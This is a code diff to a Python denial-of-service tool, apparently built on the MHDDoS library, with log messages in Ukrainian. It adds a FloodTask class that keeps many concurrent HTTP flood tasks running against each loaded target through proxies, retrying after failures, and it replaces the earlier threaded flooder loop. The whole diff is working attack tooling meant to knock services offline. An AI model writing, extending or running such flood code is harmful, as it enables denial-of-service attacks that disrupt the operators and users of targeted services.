@@ -18,6 +18,39 @@ from src.proxies import ProxySet
 from src.system import fix_ulimits, is_latest_version
 from src.targets import TargetsLoader
 
+UVLOOP_SUPPORT = False
+
+async def safe_run(runnable) -> bool:
+    try:
+        packets_sent = await runnable.run()
+        return packets_sent > 0 # XXX: change API to return "succesful or not"
+    except asyncio.CancelledError:
+        raise
+    except Exception as e:
+        return False
+
+
+class FloodTask:
+
+    def __init__(self, runnable: AsyncHttpFlood, scale: int = 1):
+        self._runnable = runnable
+        self._scale = scale
+        self._failure_budget = scale*3 # roughly: 3 attempts per proxy
+        self._failure_budget_delay = 1
+
+    async def loop(self):
+        tasks = set(asyncio.create_task(safe_run(self._runnable)) for _ in range(self._scale))
+        num_failures = 0
+        while tasks:
+            done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
+            for f in done:
+                num_failures += int(not f.result())
+                if num_failures >= self._failure_budget:
+                    await asyncio.sleep(self._failure_budget_delay)
+                    num_failures = 0
+                pending.add(asyncio.create_task(safe_run(self._runnable)))
+            tasks = pending
+
 
 # XXX: having everything on the same thread means that we can create
 #      priority queue for target (decreasing priority for "dead" targets)
@@ -116,8 +149,8 @@ async def run_ddos(
         # Keep the docs/info on-screen for some time before outputting the logger.info above
         await asyncio.sleep(5)
 
-    flooders = [Flooder(switch_after) for _ in range(total_threads)]
-    udp_tasks = []
+    #flooders = [Flooder(switch_after) for _ in range(total_threads)]
+    #udp_tasks = []
 
     async def load_targets():
         targets, changed = await targets_loader.load()
@@ -125,7 +158,7 @@ async def run_ddos(
         return [target for target in targets if target.is_resolved], changed
 
     async def install_targets(targets):
-        nonlocal udp_tasks
+        #nonlocal udp_tasks
         # XXX: looks like a hack
         for k in list(statistics):
             del statistics[k]
@@ -147,6 +180,14 @@ async def run_ddos(
                     register_params(Params(target, method), kwargs_list)
             else:
                 raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
+        
+        scale = total_threads // len(kwargs_list)
+        
+        for kwargs in kwargs_list:
+            asyncio.create_task(FloodTask(mhddos_async_main(**kwargs), scale).loop())
+
+        return
+
         if kwargs_list:
             runnables_iter = cycle(mhddos_async_main(**kwargs) for kwargs in kwargs_list)
         else:
@@ -159,6 +200,8 @@ async def run_ddos(
                 for task in udp_tasks:
                     task.cancel()
                 await asyncio.wait(udp_tasks)
+            # XXX: re-write having multiple tasks into having a single task, sending
+            #      into a random list of targets based on the configuration
             udp_runnables = [mhddos_async_main(**kwargs) for kwargs in udp_kwargs_list]
             udp_tasks = [asyncio.create_task(udp_flooder(run)) for run in udp_runnables]
 
@@ -173,7 +216,7 @@ async def run_ddos(
         exit()
     await install_targets(initial_targets)
 
-    tasks = [asyncio.ensure_future(f.loop()) for f in flooders]
+    tasks = [] #[asyncio.ensure_future(f.loop()) for f in flooders]
 
     async def stats_printer():
         refresh_rate = 5
@@ -312,13 +355,14 @@ async def start(args, shutdown_event: Event):
 
 
 if __name__ == '__main__':
-    try:
-        __import__("uvloop").install()
-        logger.info(
-            f"{cl.GREEN}uvloop{cl.RESET} успішно активований "
-            "(підвищенна ефективність роботи з мережею)")
-    except Exception:
-        pass
+    if UVLOOP_SUPPORT:
+        try:
+            __import__("uvloop").install()
+            logger.info(
+                f"{cl.GREEN}uvloop{cl.RESET} успішно активований "
+                "(підвищенна ефективність роботи з мережею)")
+        except Exception:
+            pass
 
     args = init_argparse().parse_args()
     shutdown_event = Event()
